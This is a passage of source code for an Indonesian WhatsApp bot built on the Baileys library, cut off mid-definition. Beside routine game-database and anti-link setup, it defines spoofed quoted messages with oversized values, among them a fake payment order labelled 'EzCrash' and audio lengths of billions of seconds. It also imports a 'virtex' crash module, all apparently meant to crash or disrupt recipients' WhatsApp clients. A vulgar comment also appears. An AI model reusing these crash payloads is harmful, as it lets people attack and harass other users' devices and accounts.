/*
> Kalo Mau Recode Kasih Credit gw ›
TheZetsubXygen / AkmalMods

📝 | Created By AkmalMods / Ryo
🖥️ | Base Ori By TheZetsubXygen / Ryo


*/

require('./config')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
// Disini Ada Beberapa Modul Yg Udh kg gw Pake, lu Hapus Sendiri Aj 🚬🗿
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./lib/premiun')
let afk = require("./lib/afk") //afk

//=================================================//
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkabupaten = db.data.game.tebakkabupaten = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./dtbs/enable/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./dtbs/enable/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./dtbs/enable/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./dtbs/enable/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytvideo.json'))

//=================================================//
module.exports = ryozingod = async (ryozingod, m, chatUpdate, store) => {
try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
''
);

//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await ryozingod.decodeJid(ryozingod.user.id)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
const isAfkOn = afk.checkAfkUser(m.sender, _afk)    

// Group
const groupMetadata = m.isGroup ? await ryozingod.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false

//=================================================//
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {
}
if (user) {
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 30000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0
}
//=================================================//
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
//    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: false,
//    		auto_ai_grup: true,
//    		goodbye: true,
    		onlygrub: false,
//        welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }

} catch (err) {
console.error(err)
}
//=================================================//
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
//=================================================//
const { dafontSearch, dafontDown } = require('./lib/dafont.js')
const scp1 = require('./lib/scraper.js') 
const ffstalk = require('./lib/ffstalk.js')
const githubstalk = require('./lib/githubstalk.js')
const npmstalk = require('./lib/npmstalk.js')
const mlstalk = require('./lib/mlstalk.js')
const textpro = require('./lib/textpro.js')
const photooxy = require('./lib/photooxy.js')
//=================================================//
const { ios } = require("./virtex/ios.js")
//=================================================//
if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await ryozingod.readMessages([readkey]);
}
ryozingod.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
ryozingod.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
ryozingod.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await ryozingod.updateProfileStatus(`✳️ . || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}

/*let rn = ['composing','recording','paused']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
ryozingod.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await ryozingod.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
joreply(`${err}`)
}
}
//=================================================//
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await ryozingod.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
joreply(`${err}`)
}
}
//=================================================//
//Push Kintil
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================================================//
//Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
const moment = require('moment-timezone');
const time = moment().tz("Asia/Makassar").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Selamat Malam"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄 Selamat Sore"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️ Selamat Siang"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️ Selamat Pagi"
} else {
ucapanWaktu = "🌆 Selamat Subuh"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
//Status
if (!ryozingod.public) {
if (!m.key.fromMe) return
} 

//=================================================//
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "💀 .",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - .`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - .',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` . ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ . 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ . 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
